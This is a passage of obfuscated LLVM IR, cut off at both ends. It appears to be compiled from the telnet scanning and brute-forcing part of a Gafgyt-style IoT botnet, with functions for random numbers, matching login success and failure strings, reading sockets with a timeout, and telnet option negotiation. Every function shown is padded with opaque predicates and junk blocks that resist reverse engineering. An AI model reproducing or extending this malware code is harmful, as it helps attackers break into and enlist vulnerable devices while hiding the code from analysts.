  store i32 %15, i32* @rand_cmwc.i, align 4
  %16 = load i64, i64* %10, align 8
  %17 = load i32, i32* @rand_cmwc.i, align 4
  %18 = zext i32 %17 to i64
  %19 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %18
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = mul i64 %16, %21
  %23 = load i32, i32* @c, align 4
  %24 = zext i32 %23 to i64
  %25 = add i64 %22, %24
  store i64 %25, i64* %9, align 8
  %26 = load i64, i64* %9, align 8
  %27 = lshr i64 %26, 32
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* @c, align 4
  %29 = load i64, i64* %9, align 8
  %30 = load i32, i32* @c, align 4
  %31 = zext i32 %30 to i64
  %32 = add i64 %29, %31
  %33 = trunc i64 %32 to i32
  store i32 %33, i32* %11, align 4
  %34 = load i32, i32* %11, align 4
  %35 = load i32, i32* @c, align 4
  %36 = icmp ult i32 %34, %35
  %37 = load i32, i32* @x.3
  %38 = load i32, i32* @y.4
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %36, label %45, label %50

; <label>:45:                                     ; preds = %originalBBpart2
  %46 = load i32, i32* %11, align 4
  %47 = add i32 %46, 1
  store i32 %47, i32* %11, align 4
  %48 = load i32, i32* @c, align 4
  %49 = add i32 %48, 1
  store i32 %49, i32* @c, align 4
  br label %50

; <label>:50:                                     ; preds = %45, %originalBBpart2
  %51 = load i32, i32* %12, align 4
  %52 = load i32, i32* %11, align 4
  %53 = sub i32 %51, %52
  %54 = load i32, i32* @rand_cmwc.i, align 4
  %55 = zext i32 %54 to i64
  %56 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %55
  store i32 %53, i32* %56, align 4
  ret i32 %53

originalBBalteredBB:                              ; preds = %originalBB, %0
  %57 = alloca i64, align 8
  %58 = alloca i64, align 8
  %59 = alloca i32, align 4
  %60 = alloca i32, align 4
  store i64 18782, i64* %58, align 8
  store i32 -2, i32* %60, align 4
  %61 = load i32, i32* @rand_cmwc.i, align 4
  %_ = shl i32 %61, 1
  %_1 = shl i32 %61, 1
  %_2 = shl i32 %61, 1
  %_3 = sub i32 0, %61
  %gen = add i32 %_3, 1
  %_4 = sub i32 0, %61
  %gen5 = add i32 %_4, 1
  %_6 = sub i32 %61, 1
  %gen7 = mul i32 %_6, 1
  %62 = add i32 %61, 1
  %_8 = shl i32 %62, 4095
  %_9 = sub i32 0, %62
  %gen10 = add i32 %_9, 4095
  %_11 = shl i32 %62, 4095
  %_12 = shl i32 %62, 4095
  %_13 = shl i32 %62, 4095
  %63 = and i32 %62, 4095
  store i32 %63, i32* @rand_cmwc.i, align 4
  %64 = load i64, i64* %58, align 8
  %65 = load i32, i32* @rand_cmwc.i, align 4
  %66 = zext i32 %65 to i64
  %67 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %66
  %68 = load i32, i32* %67, align 4
  %69 = zext i32 %68 to i64
  %_14 = shl i64 %64, %69
  %70 = mul i64 %64, %69
  %71 = load i32, i32* @c, align 4
  %72 = zext i32 %71 to i64
  %_15 = shl i64 %70, %72
  %_16 = sub i64 %70, %72
  %gen17 = mul i64 %_16, %72
  %_18 = sub i64 %70, %72
  %gen19 = mul i64 %_18, %72
  %_20 = shl i64 %70, %72
  %_21 = sub i64 %70, %72
  %gen22 = mul i64 %_21, %72
  %73 = add i64 %70, %72
  store i64 %73, i64* %57, align 8
  %74 = load i64, i64* %57, align 8
  %_23 = sub i64 %74, 32
  %gen24 = mul i64 %_23, 32
  %_25 = sub i64 %74, 32
  %gen26 = mul i64 %_25, 32
  %_27 = sub i64 %74, 32
  %gen28 = mul i64 %_27, 32
  %_29 = shl i64 %74, 32
  %_30 = shl i64 %74, 32
  %_31 = shl i64 %74, 32
  %75 = lshr i64 %74, 32
  %76 = trunc i64 %75 to i32
  store i32 %76, i32* @c, align 4
  %77 = load i64, i64* %57, align 8
  %78 = load i32, i32* @c, align 4
  %79 = zext i32 %78 to i64
  %80 = add i64 %77, %79
  %81 = trunc i64 %80 to i32
  store i32 %81, i32* %59, align 4
  %82 = load i32, i32* %59, align 4
  %83 = load i32, i32* @c, align 4
  %84 = icmp ult i32 %82, %83
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_string(i8*, i8**) #0 {
  %3 = load i32, i32* @x.5
  %4 = load i32, i32* @y.6
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i8**, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i8* %0, i8** %12, align 8
  store i8** %1, i8*** %13, align 8
  store i32 0, i32* %14, align 4
  store i32 0, i32* %15, align 4
  store i32 0, i32* %14, align 4
  %16 = load i32, i32* @x.5
  %17 = load i32, i32* @y.6
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %24

; <label>:24:                                     ; preds = %48, %originalBBpart2
  %25 = load i32, i32* @x.5
  %26 = load i32, i32* @y.6
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %24
  %33 = load i8**, i8*** %13, align 8
  %34 = load i32, i32* %14, align 4
  %35 = add nsw i32 %34, 1
  store i32 %35, i32* %14, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds i8*, i8** %33, i64 %36
  %38 = load i8*, i8** %37, align 8
  %39 = icmp ne i8* %38, null
  %40 = load i32, i32* @x.5
  %41 = load i32, i32* @y.6
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBBpart210, label %originalBB1alteredBB

originalBBpart210:                                ; preds = %originalBB1
  br i1 %39, label %48, label %49

; <label>:48:                                     ; preds = %originalBBpart210
  br label %24

; <label>:49:                                     ; preds = %originalBBpart210
  %50 = load i32, i32* @x.5
  %51 = load i32, i32* @y.6
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBB12, label %originalBB12alteredBB

originalBB12:                                     ; preds = %originalBB12alteredBB, %49
  store i32 0, i32* %15, align 4
  %58 = load i32, i32* @x.5
  %59 = load i32, i32* @y.6
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart214, label %originalBB12alteredBB

originalBBpart214:                                ; preds = %originalBB12
  br label %66

; <label>:66:                                     ; preds = %97, %originalBBpart214
  %67 = load i32, i32* %15, align 4
  %68 = load i32, i32* %14, align 4
  %69 = icmp slt i32 %67, %68
  br i1 %69, label %70, label %100

; <label>:70:                                     ; preds = %66
  %71 = load i8*, i8** %12, align 8
  %72 = load i8**, i8*** %13, align 8
  %73 = load i32, i32* %15, align 4
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds i8*, i8** %72, i64 %74
  %76 = load i8*, i8** %75, align 8
  %77 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %71, i8* %76)
  %78 = icmp ne i32 %77, 0
  br i1 %78, label %79, label %80

; <label>:79:                                     ; preds = %70
  store i32 1, i32* %11, align 4
  br label %101

; <label>:80:                                     ; preds = %70
  %81 = load i32, i32* @x.5
  %82 = load i32, i32* @y.6
  %83 = sub i32 %81, 1
  %84 = mul i32 %81, %83
  %85 = urem i32 %84, 2
  %86 = icmp eq i32 %85, 0
  %87 = icmp slt i32 %82, 10
  %88 = or i1 %86, %87
  br i1 %88, label %originalBB16, label %originalBB16alteredBB

originalBB16:                                     ; preds = %originalBB16alteredBB, %80
  %89 = load i32, i32* @x.5
  %90 = load i32, i32* @y.6
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBBpart218, label %originalBB16alteredBB

originalBBpart218:                                ; preds = %originalBB16
  br label %97

; <label>:97:                                     ; preds = %originalBBpart218
  %98 = load i32, i32* %15, align 4
  %99 = add nsw i32 %98, 1
  store i32 %99, i32* %15, align 4
  br label %66

; <label>:100:                                    ; preds = %66
  store i32 0, i32* %11, align 4
  br label %101

; <label>:101:                                    ; preds = %100, %79
  %102 = load i32, i32* @x.5
  %103 = load i32, i32* @y.6
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %101
  %110 = load i32, i32* %11, align 4
  %111 = load i32, i32* @x.5
  %112 = load i32, i32* @y.6
  %113 = sub i32 %111, 1
  %114 = mul i32 %111, %113
  %115 = urem i32 %114, 2
  %116 = icmp eq i32 %115, 0
  %117 = icmp slt i32 %112, 10
  %118 = or i1 %116, %117
  br i1 %118, label %originalBBpart222, label %originalBB20alteredBB

originalBBpart222:                                ; preds = %originalBB20
  ret i32 %110

originalBBalteredBB:                              ; preds = %originalBB, %2
  %119 = alloca i32, align 4
  %120 = alloca i8*, align 8
  %121 = alloca i8**, align 8
  %122 = alloca i32, align 4
  %123 = alloca i32, align 4
  store i8* %0, i8** %120, align 8
  store i8** %1, i8*** %121, align 8
  store i32 0, i32* %122, align 4
  store i32 0, i32* %123, align 4
  store i32 0, i32* %122, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %24
  %124 = load i8**, i8*** %13, align 8
  %125 = load i32, i32* %14, align 4
  %_ = shl i32 %125, 1
  %_2 = sub i32 %125, 1
  %gen = mul i32 %_2, 1
  %_3 = sub i32 %125, 1
  %gen4 = mul i32 %_3, 1
  %_5 = sub i32 %125, 1
  %gen6 = mul i32 %_5, 1
  %_7 = sub i32 0, %125
  %gen8 = add i32 %_7, 1
  %126 = add nsw i32 %125, 1
  store i32 %126, i32* %14, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds i8*, i8** %124, i64 %127
  %129 = load i8*, i8** %128, align 8
  %130 = icmp ne i8* %129, null
  br label %originalBB1

originalBB12alteredBB:                            ; preds = %originalBB12, %49
  store i32 0, i32* %15, align 4
  br label %originalBB12

originalBB16alteredBB:                            ; preds = %originalBB16, %80
  br label %originalBB16

originalBB20alteredBB:                            ; preds = %originalBB20, %101
  %131 = load i32, i32* %11, align 4
  br label %originalBB20
}

declare i32 @strcasestr(...) #1

; Function Attrs: noinline nounwind uwtable
define i32 @contains_success(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([18 x i8*], [18 x i8*]* @successes, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_fail(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @fails, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_response(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_success(i8* %3)
  %5 = icmp ne i32 %4, 0
  br i1 %5, label %10, label %6

; <label>:6:                                      ; preds = %1
  %7 = load i8*, i8** %2, align 8
  %8 = call i32 @contains_fail(i8* %7)
  %9 = icmp ne i32 %8, 0
  br label %10

; <label>:10:                                     ; preds = %6, %1
  %11 = phi i1 [ true, %1 ], [ %9, %6 ]
  %12 = load i32, i32* @x.11
  %13 = load i32, i32* @y.12
  %14 = sub i32 %12, 1
  %15 = mul i32 %12, %14
  %16 = urem i32 %15, 2
  %17 = icmp eq i32 %16, 0
  %18 = icmp slt i32 %13, 10
  %19 = or i1 %17, %18
  br i1 %19, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %10
  %20 = zext i1 %11 to i32
  %21 = load i32, i32* @x.11
  %22 = load i32, i32* @y.12
  %23 = sub i32 %21, 1
  %24 = mul i32 %21, %23
  %25 = urem i32 %24, 2
  %26 = icmp eq i32 %25, 0
  %27 = icmp slt i32 %22, 10
  %28 = or i1 %26, %27
  br i1 %28, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %20

originalBBalteredBB:                              ; preds = %originalBB, %10
  %29 = zext i1 %11 to i32
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @read_with_timeout(i32, i32, i8*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca %struct.fd_set, align 8
  %11 = alloca %struct.timeval, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  %14 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 0
  store i64 0, i64* %14, align 8
  %15 = load i32, i32* %7, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 1
  store i64 %16, i64* %17, align 8
  br label %18

; <label>:18:                                     ; preds = %4
  %19 = load i32, i32* @x.13
  %20 = load i32, i32* @y.14
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %18
  %27 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %10, i32 0, i32 0
  %28 = getelementptr inbounds [16 x i64], [16 x i64]* %27, i64 0, i64 0
  %29 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %28) #5, !srcloc !1
  %30 = extractvalue { i64, i64* } %29, 0
  %31 = extractvalue { i64, i64* } %29, 1
  %32 = trunc i64 %30 to i32
  store i32 %32, i32* %12, align 4
  %33 = ptrtoint i64* %31 to i64
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %13, align 4
  %35 = load i32, i32* @x.13
  %36 = load i32, i32* @y.14
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %43

; <label>:43:                                     ; preds = %originalBBpart2
  %44 = load i32, i32* @x.13
  %45 = load i32, i32* @y.14
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %43
  %52 = load i32, i32* %6, align 4
  %53 = srem i32 %52, 64
  %54 = zext i32 %53 to i64
  %55 = shl i64 1, %54
  %56 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %10, i32 0, i32 0
  %57 = load i32, i32* %6, align 4
  %58 = sdiv i32 %57, 64
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds [16 x i64], [16 x i64]* %56, i64 0, i64 %59
  %61 = load i64, i64* %60, align 8
  %62 = or i64 %61, %55
  store i64 %62, i64* %60, align 8
  %63 = load i32, i32* %6, align 4
  %64 = add nsw i32 %63, 1
  %65 = call i32 @select(i32 %64, %struct.fd_set* %10, %struct.fd_set* null, %struct.fd_set* null, %struct.timeval* %11)
  %66 = icmp slt i32 %65, 1
  %67 = load i32, i32* @x.13
  %68 = load i32, i32* @y.14
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBBpart232, label %originalBB1alteredBB

originalBBpart232:                                ; preds = %originalBB1
  br i1 %66, label %75, label %76

; <label>:75:                                     ; preds = %originalBBpart232
  store i32 0, i32* %5, align 4
  br label %83

; <label>:76:                                     ; preds = %originalBBpart232
  %77 = load i32, i32* %6, align 4
  %78 = load i8*, i8** %8, align 8
  %79 = load i32, i32* %9, align 4
  %80 = sext i32 %79 to i64
  %81 = call i64 @recv(i32 %77, i8* %78, i64 %80, i32 0)
  %82 = trunc i64 %81 to i32
  store i32 %82, i32* %5, align 4
  br label %83

; <label>:83:                                     ; preds = %76, %75
  %84 = load i32, i32* %5, align 4
  ret i32 %84

originalBBalteredBB:                              ; preds = %originalBB, %18
  %85 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %10, i32 0, i32 0
  %86 = getelementptr inbounds [16 x i64], [16 x i64]* %85, i64 0, i64 0
  %87 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %86) #5, !srcloc !1
  %88 = extractvalue { i64, i64* } %87, 0
  %89 = extractvalue { i64, i64* } %87, 1
  %90 = trunc i64 %88 to i32
  store i32 %90, i32* %12, align 4
  %91 = ptrtoint i64* %89 to i64
  %92 = trunc i64 %91 to i32
  store i32 %92, i32* %13, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %43
  %93 = load i32, i32* %6, align 4
  %_ = sub i32 0, %93
  %gen = add i32 %_, 64
  %_2 = sub i32 %93, 64
  %gen3 = mul i32 %_2, 64
  %_4 = shl i32 %93, 64
  %_5 = sub i32 0, %93
  %gen6 = add i32 %_5, 64
  %_7 = shl i32 %93, 64
  %_8 = sub i32 %93, 64
  %gen9 = mul i32 %_8, 64
  %_10 = shl i32 %93, 64
  %94 = srem i32 %93, 64
  %95 = zext i32 %94 to i64
  %_11 = shl i64 1, %95
  %_12 = sub i64 1, %95
  %gen13 = mul i64 %_12, %95
  %_14 = shl i64 1, %95
  %_15 = sub i64 1, %95
  %gen16 = mul i64 %_15, %95
  %96 = shl i64 1, %95
  %97 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %10, i32 0, i32 0
  %98 = load i32, i32* %6, align 4
  %_17 = sub i32 %98, 64
  %gen18 = mul i32 %_17, 64
  %_19 = shl i32 %98, 64
  %99 = sdiv i32 %98, 64
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds [16 x i64], [16 x i64]* %97, i64 0, i64 %100
  %102 = load i64, i64* %101, align 8
  %_20 = shl i64 %102, %96
  %_21 = shl i64 %102, %96
  %_22 = shl i64 %102, %96
  %_23 = sub i64 %102, %96
  %gen24 = mul i64 %_23, %96
  %_25 = shl i64 %102, %96
  %103 = or i64 %102, %96
  store i64 %103, i64* %101, align 8
  %104 = load i32, i32* %6, align 4
  %_26 = sub i32 %104, 1
  %gen27 = mul i32 %_26, 1
  %_28 = shl i32 %104, 1
  %_29 = sub i32 0, %104
  %gen30 = add i32 %_29, 1
  %105 = add nsw i32 %104, 1
  %106 = call i32 @select(i32 %105, %struct.fd_set* %10, %struct.fd_set* null, %struct.fd_set* null, %struct.timeval* %11)
  %107 = icmp slt i32 %106, 1
  br label %originalBB1
}

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #1

declare i64 @recv(i32, i8*, i64, i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @read_until_response(i32, i32, i8*, i32, i8**) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i32 %1, i32* %8, align 4
  store i8* %2, i8** %9, align 8
  store i32 %3, i32* %10, align 4
  store i8** %4, i8*** %11, align 8
  %14 = load i8*, i8** %9, align 8
  %15 = load i32, i32* %10, align 4
  %16 = sext i32 %15 to i64
  call void @llvm.memset.p0i8.i64(i8* %14, i8 0, i64 %16, i32 1, i1 false)
  %17 = load i32, i32* %7, align 4
  %18 = load i32, i32* %8, align 4
  %19 = load i8*, i8** %9, align 8
  %20 = load i32, i32* %10, align 4
  %21 = call i32 @read_with_timeout(i32 %17, i32 %18, i8* %19, i32 %20)
  store i32 %21, i32* %12, align 4
  %22 = load i8*, i8** %9, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 0
  %24 = load i8, i8* %23, align 1
  %25 = sext i8 %24 to i32
  %26 = icmp eq i32 %25, 255
  br i1 %26, label %27, label %31

; <label>:27:                                     ; preds = %5
  %28 = load i32, i32* %7, align 4
  %29 = load i8*, i8** %9, align 8
  %30 = call i32 @negotiate(i32 %28, i8* %29, i32 3)
  br label %31

; <label>:31:                                     ; preds = %27, %5
  %32 = load i8*, i8** %9, align 8
  %33 = load i8**, i8*** %11, align 8
  %34 = call i32 @contains_string(i8* %32, i8** %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %53

; <label>:36:                                     ; preds = %31
  %37 = load i32, i32* @x.15
  %38 = load i32, i32* @y.16
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %36
  store i32 1, i32* %6, align 4
  %45 = load i32, i32* @x.15
  %46 = load i32, i32* @y.16
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %70

; <label>:53:                                     ; preds = %31
  %54 = load i32, i32* @x.15
  %55 = load i32, i32* @y.16
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %53
  store i32 0, i32* %6, align 4
  %62 = load i32, i32* @x.15
  %63 = load i32, i32* @y.16
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %70

; <label>:70:                                     ; preds = %originalBBpart24, %originalBBpart2
  %71 = load i32, i32* %6, align 4
  ret i32 %71

originalBBalteredBB:                              ; preds = %originalBB, %36
  store i32 1, i32* %6, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %53
  store i32 0, i32* %6, align 4
  br label %originalBB1
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #2

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  switch i32 %12, label %77 [
    i32 255, label %13
    i32 251, label %30
    i32 252, label %30
    i32 253, label %30
    i32 254, label %30
  ]

; <label>:13:                                     ; preds = %3
  %14 = load i32, i32* @x.17
  %15 = load i32, i32* @y.18
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %13
  store i32 0, i32* %4, align 4
  %22 = load i32, i32* @x.17
  %23 = load i32, i32* @y.18
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %95

; <label>:30:                                     ; preds = %3, %3, %3, %3
  store i8 -1, i8* %8, align 1
  %31 = load i32, i32* %5, align 4
  %32 = call i64 @send(i32 %31, i8* %8, i64 1, i32 16384)
  %33 = load i8*, i8** %6, align 8
  %34 = getelementptr inbounds i8, i8* %33, i64 1
  %35 = load i8, i8* %34, align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 252, %36
  br i1 %37, label %38, label %39

; <label>:38:                                     ; preds = %30
  store i8 -2, i8* %8, align 1
  br label %70

; <label>:39:                                     ; preds = %30
  %40 = load i8*, i8** %6, align 8
  %41 = getelementptr inbounds i8, i8* %40, i64 1
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = icmp eq i32 254, %43
  br i1 %44, label %45, label %46

; <label>:45:                                     ; preds = %39
  store i8 -4, i8* %8, align 1
  br label %69

; <label>:46:                                     ; preds = %39
  %47 = load i8*, i8** %6, align 8
  %48 = getelementptr inbounds i8, i8* %47, i64 1
  %49 = load i8, i8* %48, align 1
  %50 = zext i8 %49 to i32
  %51 = icmp eq i32 3, %50
  br i1 %51, label %52, label %60

; <label>:52:                                     ; preds = %46
  %53 = load i8*, i8** %6, align 8
  %54 = getelementptr inbounds i8, i8* %53, i64 1
  %55 = load i8, i8* %54, align 1
  %56 = zext i8 %55 to i32
  %57 = icmp eq i32 %56, 253
  %58 = select i1 %57, i32 251, i32 253
  %59 = trunc i32 %58 to i8
  store i8 %59, i8* %8, align 1
  br label %68

; <label>:60:                                     ; preds = %46
  %61 = load i8*, i8** %6, align 8
  %62 = getelementptr inbounds i8, i8* %61, i64 1
  %63 = load i8, i8* %62, align 1
  %64 = zext i8 %63 to i32
  %65 = icmp eq i32 %64, 253
  %66 = select i1 %65, i32 252, i32 254
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %8, align 1
  br label %68

; <label>:68:                                     ; preds = %60, %52
  br label %69

; <label>:69:                                     ; preds = %68, %45
  br label %70

; <label>:70:                                     ; preds = %69, %38
  %71 = load i32, i32* %5, align 4
  %72 = call i64 @send(i32 %71, i8* %8, i64 1, i32 16384)
  %73 = load i32, i32* %5, align 4
  %74 = load i8*, i8** %6, align 8
  %75 = getelementptr inbounds i8, i8* %74, i64 2
  %76 = call i64 @send(i32 %73, i8* %75, i64 1, i32 16384)
  br label %94

; <label>:77:                                     ; preds = %3
  %78 = load i32, i32* @x.17
  %79 = load i32, i32* @y.18
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %77
  %86 = load i32, i32* @x.17
  %87 = load i32, i32* @y.18
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %94

; <label>:94:                                     ; preds = %originalBBpart24, %70
